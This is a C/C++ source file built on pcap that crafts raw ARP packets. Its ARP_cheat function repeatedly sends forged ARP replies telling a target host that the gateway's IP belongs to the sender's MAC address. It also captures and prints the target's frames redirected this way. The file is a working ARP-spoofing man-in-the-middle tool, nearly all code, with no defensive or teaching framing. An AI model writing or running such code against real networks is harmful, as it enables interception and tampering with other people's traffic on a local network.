#include "Headers.h"

void ARP_MakePackage(Package & pack,u_int opcode,MAC srcMAC,MAC dstMAC,unsigned long srcIP,unsigned long dstIP){
	pack.create(sizeof(MACHeader)+sizeof(ARPHeader));
	MAC_MakePackage(pack,srcMAC,dstMAC,MAC_PROTOCOL_TYPE_ARP);	
	u_char * arp_data=pack.addSection(sizeof(ARPHeader));
	ARPHeader * pARPHeader=(ARPHeader *)arp_data;
	pARPHeader->hardware_type=0x0100;
	pARPHeader->protocol_type=0x0008;
	pARPHeader->hardware_size=6;
	pARPHeader->protocol_size=4;
	pARPHeader->opcode=opcode;
	pARPHeader->MAC_sender=srcMAC;
	pARPHeader->IP_sender=srcIP;
	pARPHeader->MAC_target=dstMAC;
	pARPHeader->IP_target=dstIP;
}
//This will set the forground color for printing in a console window.
void SetColor(int ForgC)
{
	WORD wColor;
	//We will need this handle to get the current background attribute
	HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO csbi;

	//We use csbi for the wAttributes word.
	if(GetConsoleScreenBufferInfo(hStdOut, &csbi))
	{
		//Mask out all but the background attribute, and add in the forgournd color
		wColor = (csbi.wAttributes & 0xF0) + (ForgC & 0x0F);
		SetConsoleTextAttribute(hStdOut, wColor);
	}
}
void package_print(char * pdata,unsigned int p_len){
	SetColor(2);
	unsigned int i;
	if(pdata==0){
		printf("No package DATA.\n");
		return;
	}
	
	printf("<Dst>");
	for(i=0;i<6;i++){
		printf("%02x:",(unsigned char)pdata[i]);
	}
	printf("   <---   <Src>");
	for(i=6;i<12;i++){
		printf("%02x:",(unsigned char)pdata[i]);
	}
	
	/*
	for(i=0;i<p_len;i++){
		if(i%8==0)printf("  ");
		if(i%16==0)printf("\n");
		printf("%02x ",(unsigned char)pdata[i]);
	}
	*/
	printf("\n\n");
	SetColor(0);
	
}
char * package_Receive(pcap_t * fp,pcap_pkthdr &header){

	char *res;
	res=(char*)pcap_next(fp, &header);
	//if(res!=NULL)package_print(res,header.len);
	return res;
}
void ARP_cheat(pcap_t * fp,unsigned long targetIP,unsigned long gateIP,MAC myMAC,MAC targetMAC,MAC gateMAC,int times){
	unsigned int package_size=sizeof(MACHeader)+sizeof(ARPHeader);
	Package pack(SIZE_PACK_ARP);
	char *filter=new char[100];
	strcpy(filter,"ether src ");
	char tmp_mac[20];
	MAC_toString(targetMAC,tmp_mac);
	filter=strcat(filter,tmp_mac);
	filter=strcat(filter," and ether dst ");
	MAC_toString(myMAC,tmp_mac);
	filter=strcat(filter,tmp_mac);
	SetFilter(fp,filter);
	ARP_MakePackage(pack,ARP_OP_REPLY,myMAC,targetMAC,gateIP,getIP("0.0.0.0"));
	int timer=0;
	char *recvData;
	pcap_pkthdr tmp_header;
	while(times--){
		timer=(timer+1)&0x0f;
		if(timer==0){
			recvData=package_Receive(fp,tmp_header);
			while(recvData!=NULL){
				package_print(recvData,tmp_header.len);
				recvData=package_Receive(fp,tmp_header);
			}
		}else{
			send_raw_package(fp,(u_char*)pack.data,pack.length,1);
		}
	}
}